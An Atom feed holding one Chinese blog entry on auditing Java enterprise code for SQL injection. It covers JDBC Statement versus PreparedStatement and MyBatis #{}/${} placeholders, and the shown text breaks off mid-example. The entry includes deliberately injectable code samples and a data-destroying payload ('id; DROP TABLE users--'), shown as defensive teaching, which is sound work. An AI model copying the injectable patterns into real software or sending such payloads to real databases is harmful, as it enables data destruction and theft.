<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>冰神的小屋</title>
  <icon>http://godice.top/images/avatar.webp</icon>
  
  <link href="http://godice.top/atom.xml" rel="self"/>
  
  <link href="http://godice.top/"/>
  <updated>2025-04-04T10:48:28.000Z</updated>
  <id>http://godice.top/</id>
  
  <author>
    <name>Godice</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java企业常见漏洞</title>
    <link href="http://godice.top/Java%E4%BC%81%E4%B8%9A%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E.html"/>
    <id>http://godice.top/Java%E4%BC%81%E4%B8%9A%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E.html</id>
    <published>2025-03-25T10:11:09.000Z</published>
    <updated>2025-04-04T10:48:28.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li>在某 logo 是黑色的一线潮流平台实习中遇到的：企业中一般常见的漏洞：sql、越权、ssrf、未授权、硬编码 key 等&#x2F;动态加载脚本（反序列化较少）<ul><li>在公司审计的代码就不便上传了，用一些网上能找到的例子学习举例</li></ul></li></ul><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><ul><li>sql 注入的防御核心手段——预编译<ul><li>1 将SQL语句的结构提前发送到数据库进行编译<ul><li>参数作为数据单独传递、数据库会将占位符中的参数值视为数据，而非 sql 代码</li></ul></li><li>2 自动转移特殊字符</li></ul></li></ul><h3 id="企业-sql-简述"><a href="#企业-sql-简述" class="headerlink" title="企业 sql 简述"></a>企业 sql 简述</h3><ul><li>现象：企业级 java 白盒一般使用 sink 点进行告警，然后需要人工审计追踪数据流。但是其中存在大量误报</li><li>误报原因：<ul><li>MyBatis 中有两种拼接用户输入的占位符号，到 sql 语句中进行查询</li><li><code>$&#123;&#125;</code>是直接拼接，但是不容易报错</li><li><code>#&#123;&#125;</code>会对数据进行预编译，但是使用不规范易报错</li><li>这就要求开发者在代码健壮性（不易报错）和 sql 注入的风险之间平衡</li></ul></li><li>误报场景：<ul><li><code>$&#123;&#125;</code>虽然直接拼接，触发了告警策略，但是可能存在以下场景，该用法是安全的</li><li>1：在后续的传参追踪中，做了一些类型转换&#x2F;白名单之类的去掉了可能的注入可能</li><li>2：在数据定义时做了限制——限制为整形</li><li>3：使用的参数<code>$&#123;id&#125;</code>是从数据库中查询出来的<ul><li>注意：这里可能存在二次注入风险，但是风险较小，一般企业中判断这种情况为误报</li></ul></li></ul></li><li>审计核心：<ul><li>1：追踪危险传参的数据流（<code>Mapper.select</code>）<ul><li>白盒 sink 点，会直接正向给出传参，正向追踪即可 post&#x2F;get-service-impl…</li><li>代码审计（没有 sink 点可以用），需要在 idea 中反向追踪<ul><li>这时候可以采用黑白盒结合的方式（eg：直接 idea 搜索<code>$</code>）</li></ul></li></ul><p></p></li><li>2：通过多种手段分析，是否能确定该处不存在注入</li></ul></li><li>存在注入核心：参数可控（不是从数据库查的数据拼接）、未预编译（<code>$&#123;&#125;</code>）、未限制类型为整形</li></ul><h3 id="java-中执行-sql-的方式"><a href="#java-中执行-sql-的方式" class="headerlink" title="java 中执行 sql 的方式"></a>java 中执行 sql 的方式</h3><h4 id="java-sql-Statement-执行"><a href="#java-sql-Statement-执行" class="headerlink" title="java.sql.Statement 执行"></a>java.sql.Statement 执行</h4><ul><li><font style="color:rgb(0, 0, 0);">JDBC ：是 java 中用于连接、操作数据库的 api</font></li><li><font style="color:rgb(0, 0, 0);">Statement是Java JDBC下执行SQL语句的一种原生方式，执行语句时需要拼接</font><ul><li><font style="color:rgb(0, 0, 0);">若拼接的语句没有有效过滤过滤，将出现SQL 注入</font></li></ul></li></ul><p><strong>JDBC 使用步骤</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加载驱动</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line"><span class="comment">//建立连接</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(</span><br><span class="line">    <span class="string">&quot;jdbc:mysql://localhost:3306/mydb&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;password&quot;</span></span><br><span class="line">);<span class="comment">//DBURL、DBUser、DBPassWord</span></span><br><span class="line"><span class="comment">//创建Statement对象</span></span><br><span class="line"><span class="type">Statement</span> <span class="variable">state</span> <span class="operator">=</span> conn.createStatement();  <span class="comment">// </span></span><br><span class="line"><span class="comment">//定义&amp;执行sql</span></span><br><span class="line">String sql=<span class="string">&quot;SELECT*FROM user WHERE id=&quot;</span>+id+<span class="string">&quot;&quot;</span>;</span><br><span class="line">state. executeQuery(sql);</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(</span><br><span class="line">    <span class="string">&quot;jdbc:mysql://192.168.88.20:3306/iwebsec?useSSL=false&amp;serverTimezone=UTC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;root&quot;</span>  <span class="comment">// 注意密码的引号闭合</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> <span class="string">&quot;2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM user WHERE id = &quot;</span> + id;</span><br><span class="line"></span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();  <span class="comment">// 创建Statement对象：应使用PreparedStatement代替</span></span><br><span class="line"></span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);  <span class="comment">// 执行查询并获取结果集</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (rs.next()) &#123;  <span class="comment">//遍历打印结果集</span></span><br><span class="line">    System.out.println(</span><br><span class="line">        <span class="string">&quot;id: &quot;</span> + rs.getInt(<span class="string">&quot;id&quot;</span>) + </span><br><span class="line">        <span class="string">&quot;, username: &quot;</span> + rs.getString(<span class="string">&quot;username&quot;</span>) + </span><br><span class="line">        <span class="string">&quot;, password: &quot;</span> + rs.getString(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭资源</span></span><br><span class="line">rs.close();</span><br><span class="line">stmt.close();</span><br><span class="line">conn.close();</span><br></pre></td></tr></table></figure><p>上面代码没有使用预编译<code>PreparedStatement</code>，存在 sql 注入风险</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/74ff0913e0516ba39d862f2a322fc89f.png"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="java-sql-PreparedStatement-执行"><a href="#java-sql-PreparedStatement-执行" class="headerlink" title="java.sql.PreparedStatement 执行"></a>java.sql.PreparedStatement 执行</h4><ul><li><code>PreparedStatement</code>是继承<code>Statement</code>的子接口——使用预编译处理参数<ul><li>占位符<code>?</code></li></ul></li><li>Sql 语句：预先定义结构、但参数值未被指定（多个 <code>IN参数</code>，用<code>?</code>作占位符）</li><li>参数设定：<ul><li>每个占位符的值，通过 sql 执行前的<code>setXXX</code>提供<ul><li><code>setInt</code></li><li><code>setString</code></li></ul></li></ul></li><li>优势：<ul><li>执行速度更快：提前预编译执行结构、会缓存在数据库</li><li>防止 sql 攻击：参数只被当作查询值（而不是 sql 语句），同时转义特殊字符</li></ul></li></ul><p>案例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PreparedStatementExample</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据库连接信息</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/mydb?useSSL=false&amp;serverTimezone=UTC&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">USER</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        insertUser(<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;alice@example.com&quot;</span>, <span class="number">25</span>);  <span class="comment">// 新增用户</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> getUserById(<span class="number">1</span>);  <span class="comment">// 查询用户</span></span><br><span class="line">        System.out.println(<span class="string">&quot;查询结果: &quot;</span> + user);</span><br><span class="line">        updateUserAge(<span class="number">1</span>, <span class="number">30</span>);  <span class="comment">// 更新用户年龄</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除用户</span></span><br><span class="line">        deleteUser(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ================== 新增用户（INSERT） ==================</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">insertUser</span><span class="params">(String username, String email, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;INSERT INTO user (username, email, age) VALUES (?, ?, ?)&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 使用 try-with-resources 自动关闭资源</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(URL, USER, PASSWORD);</span><br><span class="line">             <span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(sql)) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 设置参数（注意索引从1开始）</span></span><br><span class="line">            pstmt.setString(<span class="number">1</span>, username);</span><br><span class="line">            pstmt.setString(<span class="number">2</span>, email);</span><br><span class="line">            pstmt.setInt(<span class="number">3</span>, age);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 执行更新（INSERT/UPDATE/DELETE）</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">rowsAffected</span> <span class="operator">=</span> pstmt.executeUpdate();</span><br><span class="line">            System.out.println(<span class="string">&quot;插入成功，影响行数: &quot;</span> + rowsAffected);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ================== 根据ID查询用户（SELECT） ==================</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> User <span class="title function_">getUserById</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM user WHERE id = ?&quot;</span>;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(URL, USER, PASSWORD);</span><br><span class="line">             <span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(sql)) &#123;</span><br><span class="line">            </span><br><span class="line">            pstmt.setInt(<span class="number">1</span>, id);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> (<span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstmt.executeQuery()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rs.next()) &#123;</span><br><span class="line">                    user = <span class="keyword">new</span> <span class="title class_">User</span>(</span><br><span class="line">                        rs.getInt(<span class="string">&quot;id&quot;</span>),</span><br><span class="line">                        rs.getString(<span class="string">&quot;username&quot;</span>),</span><br><span class="line">                        rs.getString(<span class="string">&quot;email&quot;</span>),</span><br><span class="line">                        rs.getInt(<span class="string">&quot;age&quot;</span>)</span><br><span class="line">                    );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ================== 更新用户年龄（UPDATE） ==================</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">updateUserAge</span><span class="params">(<span class="type">int</span> id, <span class="type">int</span> newAge)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;UPDATE user SET age = ? WHERE id = ?&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(URL, USER, PASSWORD);</span><br><span class="line">             <span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(sql)) &#123;</span><br><span class="line">            </span><br><span class="line">            pstmt.setInt(<span class="number">1</span>, newAge);</span><br><span class="line">            pstmt.setInt(<span class="number">2</span>, id);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">rowsAffected</span> <span class="operator">=</span> pstmt.executeUpdate();</span><br><span class="line">            System.out.println(<span class="string">&quot;更新成功，影响行数: &quot;</span> + rowsAffected);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ================== 删除用户（DELETE） ==================</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteUser</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;DELETE FROM user WHERE id = ?&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(URL, USER, PASSWORD);</span><br><span class="line">             <span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(sql)) &#123;</span><br><span class="line">            </span><br><span class="line">            pstmt.setInt(<span class="number">1</span>, id);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">rowsAffected</span> <span class="operator">=</span> pstmt.executeUpdate();</span><br><span class="line">            System.out.println(<span class="string">&quot;删除成功，影响行数: &quot;</span> + rowsAffected);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 用户实体类（辅助数据封装）</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">        <span class="keyword">private</span> String username;</span><br><span class="line">        <span class="keyword">private</span> String email;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(<span class="type">int</span> id, String username, String email, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.id = id;</span><br><span class="line">            <span class="built_in">this</span>.username = username;</span><br><span class="line">            <span class="built_in">this</span>.email = email;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> String.format(<span class="string">&quot;User&#123;id=%d, username=&#x27;%s&#x27;, email=&#x27;%s&#x27;, age=%d&#125;&quot;</span>,</span><br><span class="line">                id, username, email, age);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="预编译风险"><a href="#预编译风险" class="headerlink" title="预编译风险"></a>预编译风险</h4><p>动态拼接结构（非参数部分）</p><ul><li><strong>预编译的绕过</strong>（<code>Statement</code>中的占位符是<code>?</code>）<ul><li>预编译<strong>仅对参数值</strong>（查询值）进行转义和隔离，sql 的结构部分（表名、列名、排序字段）无法用占位符</li></ul></li></ul><p>案例：动态拼接 sql 结构（非参数部分）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">userInput</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;orderBy&quot;</span>); <span class="comment">// 用户传入 &quot;id; DROP TABLE users--&quot;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users ORDER BY &quot;</span> + userInput; <span class="comment">// 直接拼接</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> (<span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(sql)) &#123;</span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstmt.executeQuery();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>用户传参<code>id; DROP TABLE users--</code>闭合语句<ul><li>实际查询语句<code>SELECT * FROM users ORDER BY id; DROP TABLE users--</code></li></ul></li><li>解决：白名单-只允许合法字符<code>id、name、email</code>等</li></ul><h4 id="Mybatis-Mybatis-Plus"><a href="#Mybatis-Mybatis-Plus" class="headerlink" title="Mybatis&amp;Mybatis-Plus"></a>Mybatis&amp;Mybatis-Plus</h4><ul><li>Mybatis：需要手写所有 sql ，通过 XML 描述符 or 注解把对象与 sql 语句关联<ul><li>（在需要高度自定义 sql 和效率等使用）</li></ul></li><li>Mybatis-Plus 是 Mybatis 的超集，保留灵活性的基础上，实现基础的自动化 sql 生成<ul><li>通过<code>QueryWrapper</code>、<code>LambdaQueryWrapper</code>等</li></ul></li></ul><h4 id="MyBatis-执行"><a href="#MyBatis-执行" class="headerlink" title="MyBatis 执行"></a>MyBatis 执行</h4><p>（一般企业工程中 MyBtis 和 Mybatis-Plus 用的多一点，用原生的 Statement 和 PreparedStatement 很少）</p><ul><li>MyBatis 有两种方式自定义 SQL：<ul><li>1 直接在 <code>Mapper</code> 接口上加上注解 （适合简单的）<ul><li><code>@Select</code>关联</li></ul></li><li>2 在 <code>XML</code> 中定义 SQL 语句（适合复杂动态的）<ul><li>通过<code>namespace</code>和 sql 中的 id 关联</li></ul></li></ul></li></ul><p>假设 User 表的实体类定义和 Mapper 接口如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="comment">// getter/setter 省略</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    <span class="comment">// 方法定义：根据 ID 查询用户</span></span><br><span class="line">    User <span class="title function_">findUserById</span><span class="params">(Long id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="注解实现"><a href="#注解实现" class="headerlink" title="注解实现"></a>注解实现</h5><p>但是不支持复杂动态 sql，eg<code>&lt;if&gt;</code>、<code>&lt;foreach&gt;</code>，需要借助<code>@SelectProvider</code>or<code>xml</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    <span class="meta">@Select(&quot;SELECT id, username, email FROM user WHERE id = #&#123;id&#125;&quot;)</span>  <span class="comment">// 预编译拼接</span></span><br><span class="line">    User <span class="title function_">findUserById</span><span class="params">(Long id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="XML-实现"><a href="#XML-实现" class="headerlink" title="XML 实现"></a>XML 实现</h5><p>在 XML 文件中，通过 <code>&lt;mapper&gt;</code> 标签的 <code>namespace</code> 属性定义命名空间，该值必须与对应的 Mapper 接口的全限定类名一致。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 路径：src/main/resources/com/example/mapper/UserMapper.xml --&gt;</span><br><span class="line">&lt;mapper namespace=<span class="string">&quot;com.example.mapper.UserMapper&quot;</span>&gt;</span><br><span class="line">    &lt;select id=<span class="string">&quot;findUserById&quot;</span> resultType=<span class="string">&quot;com.example.entity.User&quot;</span>&gt;</span><br><span class="line">        SELECT * FROM user <span class="type">WHERE</span> <span class="variable">id</span> <span class="operator">=</span> #&#123;id&#125;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">&lt;/mapper&gt;</span><br></pre></td></tr></table></figure><p>Mapper 接口的 全限定类名（即包名 + 接口名）隐式成为其命名空间，无需额外定义。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 路径：src/main/java/com/example/mapper/UserMapper.java</span></span><br><span class="line"><span class="keyword">package</span> com.example.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    User <span class="title function_">findUserById</span><span class="params">(Long id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Mybatis占位符分析"><a href="#Mybatis占位符分析" class="headerlink" title="Mybatis占位符分析"></a>Mybatis占位符分析</h3><p><a href="https://www.freebuf.com/articles/web/381239.html">参考好文</a></p><ul><li>两种占位符<ul><li><code>#&#123;&#125;</code>会预编译，但是使用有比较严格的规范，容易报错</li><li><code>$&#123;&#125;</code>直接拼接，不容易报错，但易造成 sql 注入（以下几种情况可以使用<code>$&#123;&#125;</code>）<ul><li>1 是从数据库中直接查的数据 （虽然可能存在二次注入，但可能性较小）</li><li>2 传参限制了类型为整形</li><li>3 做了白名单、严格限制、编译等自定义措施</li></ul></li></ul></li></ul><h4 id="IN-查询"><a href="#IN-查询" class="headerlink" title="IN 查询"></a>IN 查询</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// xml</span></span><br><span class="line">&lt;select id=<span class="string">&quot;selectNews&quot;</span> resultType=<span class="string">&quot;News&quot;</span>&gt;</span><br><span class="line">    SELECT * FROM news WHERE id <span class="title function_">IN</span> <span class="params">(#&#123;ids&#125;)</span></span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><ul><li>预编译了查询参数，若传参<code>ids = &quot;1,2,3&quot;</code>最终执行 sql 如下<ul><li><code>SELECT * FROM news WHERE id IN (&#39;1,2,3&#39;)</code></li><li>数据库查询 id 值等于字符串<code>1,2,3</code>的，而不是查询值等于 1&#x2F;2&#x2F;3——会报错</li></ul></li><li>若改用<code>$&#123;&#125;</code>，不会报错<ul><li><code>SELECT * FROM news WHERE id IN (1,2,3)</code></li><li>数据库查询值等于 1&#x2F;2&#x2F;3，但会存在 sql 注入风险</li></ul></li><li>解决方案：使用<code>&lt;foreach&gt;</code>标签——用于动态生成多个 <code>IN </code>的占位符</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//xml</span></span><br><span class="line">&lt;select id=<span class="string">&quot;selectNewsByIds&quot;</span> resultType=<span class="string">&quot;News&quot;</span>&gt;</span><br><span class="line">    SELECT * FROM news WHERE id IN</span><br><span class="line">    &lt;foreach item=<span class="string">&quot;id&quot;</span> collection=<span class="string">&quot;ids&quot;</span> 